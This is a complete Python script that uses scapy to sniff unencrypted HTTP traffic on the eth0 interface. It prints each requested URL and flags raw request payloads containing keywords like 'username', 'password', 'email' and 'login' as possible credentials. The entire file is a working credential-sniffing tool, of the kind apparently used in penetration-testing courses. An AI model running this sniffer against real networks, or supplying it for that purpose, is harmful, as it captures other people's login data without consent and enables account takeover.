#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False , prn = process_sniffed_packet)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode(errors="ignore") if packet[http.HTTPRequest].Host else "Unknown Host"
        path = packet[http.HTTPRequest].Path.decode(errors="ignore") if packet[http.HTTPRequest].Path else "/"
        return host + path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors="ignore")
        keywords = ["username", "password", "email", "gmail", "pass", "login", "user", "signup"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url =  get_url(packet)
        print("[+] HTTP request >>" + str(url))
        login_info = get_login_info(packet)
        if login_info :
            print("\n\n[+] Possible username/password >" + login_info +"\n\n")






sniff("eth0")